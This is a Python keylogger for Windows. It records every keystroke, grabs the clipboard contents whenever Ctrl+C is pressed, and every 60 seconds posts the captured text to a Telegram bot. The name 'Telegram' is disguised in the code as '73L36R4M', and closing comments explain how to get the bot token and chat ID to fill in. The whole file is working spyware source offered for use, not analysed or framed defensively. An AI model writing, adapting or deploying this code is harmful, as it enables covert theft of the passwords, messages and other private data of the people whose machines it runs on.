from pynput import keyboard # for controlling the keyboard
import requests # to make posts to telegram bot.
import threading # to spawn timer threads
import win32clipboard # pip install pywin32 (win32clipboard is a part of pywin32)

TEXT_CONTAINER = ""


# function for 73L36R4M
def send_to_73L36R4M():
    global TEXT_CONTAINER
    BOT_TOKEN = ""
    CHAT_ID = ""

    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': TEXT_CONTAINER
    }

    try:
        if len(TEXT_CONTAINER) > 100:
            response = requests.post(url, data=payload)  # Sending POST request to 73L36R4M
            if response.status_code == 200:
                TEXT_CONTAINER = ""
            # print(TEXT_CONTAINER)
    except AttributeError:
        pass

    thread = threading.Timer(60, send_to_73L36R4M)
    thread.start()


# Calling this function when a key is pressed on keyboard
def key_press(key):
    global TEXT_CONTAINER

    if key == keyboard.Key.enter:
        TEXT_CONTAINER += "\n"
    elif "\\x03" in str(key):
        pass
    elif "\\x16" in str(key):
        TEXT_CONTAINER += "Ctrl V"
    elif key == keyboard.Key.tab:
        TEXT_CONTAINER += "\t"
    elif key == keyboard.Key.space:
        TEXT_CONTAINER += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(TEXT_CONTAINER) == 0:
        pass
    elif key == keyboard.Key.backspace and len(TEXT_CONTAINER) > 0:
        TEXT_CONTAINER = TEXT_CONTAINER[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    else:
        TEXT_CONTAINER += str(key).strip("'")


# Calling this function when ever a key is released.
def key_release(key):
    global TEXT_CONTAINER
    try:
        # when ctrl+C pressed on the machine, getting clipboard content and append to text variable.
        if key.char == "\x03":
            win32clipboard.OpenClipboard()
            value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            TEXT_CONTAINER += f"\nPaste: {value}\n"
    except AttributeError:
        pass


send_to_73L36R4M()
with keyboard.Listener(on_press=key_press, on_release=key_release) as recorder:
    recorder.join()


# https://t.me/BotFather (to create a bot and get bot token)
# https://t.me/getmyid_bot (to get chat ID)
